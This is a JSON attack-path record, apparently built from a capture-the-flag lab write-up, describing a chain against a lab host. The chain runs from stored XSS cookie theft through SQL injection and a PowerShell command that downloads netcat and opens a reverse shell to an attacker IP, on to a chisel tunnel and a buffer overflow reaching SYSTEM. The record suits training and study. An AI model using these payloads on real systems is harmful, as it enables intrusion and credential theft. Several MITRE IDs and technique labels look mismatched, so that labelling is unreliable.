{ "id": "ap-0016", "title": "Initial Access & Privilege Escalation: SQLi -> XSS/CSRF -> RC -> Buffer/Input Overflow -> System", "summary": "Exploiting stored Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) via an administrative interface to achieve Remote Command Execution (RC), followed by local privilege escalation by exploiting an input overflow in a custom binary, leading to NT Authority\System privileges.", "attack_path_markdown": "### Step 1: Reconnaissance\nInitial scanning and service enumeration reveals exposed web and database services.\n### Step 2: Exploitation & Initial Access\nAuthentication bypass via stored XSS/CSRF steals administrator cookies, leading to a privileged session where SQL Injection (SQLi) and Remote Command Execution (RC) vulnerabilities are chained to gain an initial shell as a low-privileged user.\n### Step 3: Privilege Escalation\nLocal enumeration reveals a custom application service running on a non-standard port. Port forwarding is used to access the service, and an input overflow vulnerability in the application is exploited to gain SYSTEM level access.", "kill_chain": [ { "phase_order": 1, "phase_name": "Reconnaissance", "description": "Information gathering on the target system to identify services and potential entry points.", "actions": [ "Check machine status and OS type using ping 10 10 10 154 (identifies Windows based on TTL 127/128).", "Scan for open ports using Nmap SYN scan (nmap -p- -sS --min-rate 5000 -n -Pn 10 10 10 154).", "Perform exhaustive Nmap scan for service versions and basic scripts (nmap -sV -sC -p 80,443,445,3306 10 10 10 154).", "Enumerate web services using WatWeb (watweb http://10.10.10.154).", "Inspect SSL certificate using OpenSSL (openssl s_client -connect 10.10.10.154:443).", "Attempt SMB enumeration using CrackMapExec (crackmapexec smb 10.10.10.154) and smbclient." ], "tools": ["ping", "nmap", "watweb", "openssl", "crackmapexec", "smbclient"], "techniques": ["Active Scanning", "Service Enumeration", "Vulnerability Identification"], "mitre_ids": ["T1595", "T1046", "T1082"], "indicators": ["TTL 127/128", "Open ports 80, 443, 445, 3306", "Web application interface"], "preconditions": "Network connectivity to the target machine.", "expected_outcome": "List of running services and initial application details.", "confidence": 1.0 }, { "phase_order": 2, "phase_name": "Weaponization", "description": "Creation of malicious payloads (JavaScript/SQLi query) designed to exploit identified vulnerabilities.", "actions": [ "Register a user account ('xavitar', 'xavitar123').", "Identify session cookie format (Base64 encoded 'username' and 'password').", "Craft a malicious JavaScript payload (poc.js) to steal session cookies via an AJAX request (new XMLHttpRequest) and send them to the attackerâ€™s listening server (document.cookie).", "Craft a command execution JavaScript payload (poc.js modification) targeting the backdoor_checker.php route via POST request (CSRF/XSS chain), forcing the request to appear as if it originates from 'localhost'." ], "tools": ["php interactive (for Base64/URL decoding)", "python (for HTTP server and payload hosting)"], "techniques": ["Cross-Site Scripting (XSS) Payload Crafting", "Cross-Site Request Forgery (CSRF) Initiation", "Remote Access Tool (RAT) Acquisition"], "mitre_ids": ["T1059.007", "T1598"], "indicators": ["Base64 encoded cookies", "JavaScript file containing cookie retrieval logic"], "preconditions": "Web application supporting user registration and vulnerable input field (comment/transfer details).", "expected_outcome": "Ready-to-deploy XSS/CSRF payload.", "confidence": 1.0 }, { "phase_order": 3, "phase_name": "Delivery", "description": "Transmission of the malicious payload to the victim's environment, exploiting the administrator's workflow.", "actions": [ "Insert the Stored XSS payload (linking to the hosted poc.js on the attacker machine) into the coin transfer 'comment' field." ], "tools": ["Web browser"], "techniques": ["Stored Cross-Site Scripting (XSS)", "Traffic Amplification"], "mitre_ids": ["T1059.007", "T1071.001"], "indicators": ["Admin user accessing the crafted transfer comment."], "preconditions": "Administrator privileges required to view/approve transactions.", "expected_outcome": "Admin's browser executes the external JavaScript.", "confidence": 1.0 }, { "phase_order": 4, "phase_name": "Exploitation", "description": "Utilizing the initial access and discovered vulnerabilities to gain control over the system.", "actions": [ "Receive the admin session cookie via the XSS payload execution.", "Decode the admin cookie to obtain credentials ('admin', 'hopelessromantic').", "Log in as the administrator.", "Identify and exploit SQL Injection (SQLi) in the user search function (' OR 1=1-- ).", "Enumerate database structure and retrieve hardcoded credentials using UNION SELECT and database functions (e.g., GROUP_CONCAT(user, 0x3a, password) FROM mysql.user).", "Crack the retrieved MySQL hash (SHA1) to obtain the 'root' password ('Welcome1!'). (Note: This was not immediately useful for MySQL connection).", "Exploit SQLi LOAD_FILE to read the source code of the vulnerable administrative PHP file (C:\\xampp\\htdocs\\admin\\backdoor_checker.php).", "Execute the CSRF/RC payload to download NetCat (nc.exe) and establish a reverse shell as user kortin." ], "tools": ["Web browser", "PHP interactive", "John the Ripper (John)", "MySQL client (for testing)", "netcat (nc)"], "techniques": ["Stored XSS", "Cross-Site Request Forgery (CSRF)", "SQL Injection (SQLi)", "Remote Command Execution (RC)"], "mitre_ids": ["T1059.007", "T1558.003", "T1190", "T1213"], "indicators": ["Successful admin login", "SQL syntax errors", "HTTP requests containing command parameters", "Successful reverse shell connection."], "preconditions": "Access to the administrative panel and valid XSS/CSRF chain.", "expected_outcome": "Initial low-privilege shell access (as 'kortin').", "confidence": 1.0 }, { "phase_order": 5, "phase_name": "Installation", "description": "Establishing a foothold on the system.", "actions": [ "Transfer NetCat binary (nc.exe) to the victim machine using PowerShell's Invoke-WebRequest function within the RC payload.", "Execute the command powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.29/nc.exe','C:\\Users\\kortin\\AppData\\Local\\Temp\\nc.exe'); C:\\Users\\kortin\\AppData\\Local\\Temp\\nc.exe -e cmd.exe 10.10.14.29 443\" (or similar logic) to download and run NetCat, establishing a persistent connection." ], "tools": ["PowerShell", "netcat (nc)"], "techniques": ["Remote Access Tool (RAT) Transfer", "Persistence via Shell Execution"], "mitre_ids": ["T1105", "T1547"], "indicators": ["NetCat binary present in %TEMP%", "Shell connection received on port 443."], "preconditions": "Successful Remote Command Execution (RC) capability.", "expected_outcome": "Interactive command shell (cmd.exe) as 'kortin'.", "confidence": 1.0 }, { "phase_order": 6, "phase_name": "Command and Control", "description": "Maintaining communication with the compromised system and preparing for privilege escalation.", "actions": [ "Use whoami and tasklist to enumerate running processes (identifying Bank_v2.exe Pid 1660).", "Use netstat or PowerShell scripts to identify network connections and map the Bank_v2.exe process to port 910.", "Transfer the chisel binary to the target machine (certutil -urlcache -f [URL] chisel.exe).", "Establish a remote port forward tunnel using Chisel to expose the internal port 910 to the attacker machine's port 910 (chisel.exe client 10.10.14.29:1234 R:910:127.0.0.1:910)." ], "tools": ["tasklist", "netstat", "certutil", "chisel"], "techniques": ["Process Discovery", "Port Monitoring", "Port Forwarding/Tunneling"], "mitre_ids": ["T1057", "T1090.003", "T1572"], "indicators": ["Chisel client running on the victim machine", "Port 910 accessible locally on the attacker machine."], "preconditions": "Interactive shell access and binary transfer capability.", "expected_outcome": "Direct access to the internal Bank_v2.exe service.", "confidence": 1.0 }, { "phase_order": 7, "phase_name": "Actions on Objectives", "description": "Gaining maximum privileges and achieving the primary goal (flag retrieval).", "actions": [ "Interact with the tunneled service on port 910.", "Develop a Python script to brute-force the 4-digit PIN required by the Bank_v2.exe application (using sockets and ranges 0000 to 9999).", "Discover the correct PIN: 0021.", "Identify an input overflow vulnerability in the coin transfer amount input of Bank_v2.exe (using 'A' padding).", "Determine the offset required to control execution flow (32 bytes).", "Craft the final payload: 32 bytes padding followed by the full path to nc.exe (C:\\Users\\kortin\\AppData\\Local\\Temp\\nc.exe -e cmd.exe 10.10.14.29 443).", "Execute the exploit using the correct PIN (0021) and the crafted overflow string.", "Receive the final shell as NT Authority\System.", "Retrieve the root flag (root.txt)." ], "tools": ["Python (scripting)", "netcat (nc)", "Bank_v2.exe (internal application)"], "techniques": ["Brute Force", "Exploitation for Privilege Escalation", "Input Overflow", "Artifact Destruction"], "mitre_ids": ["T1110", "T1548.002", "T1484"], "indicators": ["'Access Granted' message from Bank_v2.exe", "SYSTEM shell received."], "preconditions": "Access to the internal Bank_v2.exe service and knowledge of the binary's execution path.", "expected_outcome": "SYSTEM level privileges and flag retrieval.", "confidence": 1.0 } ], "tactics": ["Reconnaissance", "Initial Access", "Privilege Escalation", "Credential Access", "Command and Control", "Exfiltration", "Execution"], "techniques": ["Cross-Site Scripting (XSS)", "SQL Injection", "Input Overflow", "Port Tunneling", "Brute Force"], "mitre_ids": ["T1059.007", "T1558.003", "T1110", "T1049", "T1053.005", "T1078"], "hosts": ["10.10.10.154"], "privs_obtained": ["domain user", "administrator (via cookie)", "kortin (initial shell)", "NT Authority\System"], "confidence": 1.0, "source_file": "", "notes": "Chained multiple web vulnerabilities (XSS, CSRF, SQLi) to gain initial access, followed by a custom binary input overflow vulnerability for local privilege escalation.", "labels": ["attack_path", "web_exploitation", "windows_lpe", "binary_exploitation", "chisel"] }